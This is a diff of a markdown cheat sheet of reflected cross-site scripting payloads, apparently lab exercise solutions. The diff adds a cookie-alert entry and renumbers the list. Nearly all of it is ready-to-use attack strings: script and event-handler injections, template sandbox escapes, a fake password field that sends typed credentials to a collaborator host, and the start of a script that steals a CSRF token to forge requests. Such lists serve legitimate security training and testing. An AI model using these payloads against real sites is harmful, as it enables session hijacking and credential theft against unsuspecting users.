@@ -36,23 +36,24 @@ Reflected XSS
 1. ```<script>alert(1)</script>```
 2. ```"><svg onload=alert(1)>```
 3. ```<img src=1 onerror=alert(1)>```
-4. ```javascript:alert(document.cookie)```
-5. ```<img src=1 onerror=print()>```
-6. ```"onmouseover="alert(1)```
-7. ```javascript:alert(1)```
-8. ```'-alert(1)-'```
-9. ```product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>```
-10. ```{{$on.constructor('alert(1)')()}}```
-11. ```\"-alert(1)}//```
-12. ```<><img src=1 onerror=alert(1)>```
-13. ```<iframe src="https://YOUR-LAB-ID.com/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>```
-14. ```<script>location = 'https://YOUR-LAB-ID.com?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';</script>```
-15. ```/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E```
-16. ```/?%27accesskey=%27x%27onclick=%27alert(1)```
-17. ```</script><script>alert(1)</script>```
-18.  ```\'-alert(1)//```
-19. ```http://foo?&apos;-alert(1)-&apos;```
-20. ```<input name=username id=username><input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{method:'POST',mode: 'no-cors',body:username.value+':'+this.value});">```
+4. ```<img src="x" onerror="alert(document.cookie)">```
+5. ```javascript:alert(document.cookie)```
+6. ```<img src=1 onerror=print()>```
+7. ```"onmouseover="alert(1)```
+8. ```javascript:alert(1)```
+9. ```'-alert(1)-'```
+10. ```product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>```
+11. ```{{$on.constructor('alert(1)')()}}```
+12. ```\"-alert(1)}//```
+13. ```<><img src=1 onerror=alert(1)>```
+14. ```<iframe src="https://YOUR-LAB-ID.com/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>```
+15. ```<script>location = 'https://YOUR-LAB-ID.com?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';</script>```
+16. ```/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E```
+17. ```/?%27accesskey=%27x%27onclick=%27alert(1)```
+18. ```</script><script>alert(1)</script>```
+19.  ```\'-alert(1)//```
+20. ```http://foo?&apos;-alert(1)-&apos;```
+21. ```<input name=username id=username><input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{method:'POST',mode: 'no-cors',body:username.value+':'+this.value});">```
 221. ```<script>var req = new XMLHttpRequest();req.onload = handleResponse;req.open('get','/my-account',true);req.send();function handleResponse() {
     var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
     var changeReq = new XMLHttpRequest();
